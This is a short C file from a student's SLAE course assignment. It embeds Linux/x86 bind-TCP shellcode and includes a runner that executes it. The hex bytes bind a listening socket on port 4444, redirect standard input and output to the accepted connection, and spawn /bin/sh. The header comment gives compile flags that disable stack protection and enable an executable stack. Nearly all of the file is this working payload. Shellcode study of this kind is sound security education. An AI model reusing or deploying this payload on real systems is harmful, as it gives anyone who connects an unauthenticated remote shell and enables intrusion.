/*
 *      SLAE - Assignment #1: Shell Bind TCP Shellcode (Linux/x86)
 *      author: Alain Menelet 
 *      StudentID - SLAE-3763
 *      HowTo: gcc -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode
 */

#include <stdio.h>
#include <string.h>


unsigned char code[] = \
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x92\x5b\x5e\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\xb0\x66\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\x89\xe1\xcd\x80\x89\x41\x08\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

int main()
 {
 
         printf("taille %d\n", strlen(code));
 
         int (*ret)() = (int(*)())code;
 
         ret();
 
         return 0;
 
 }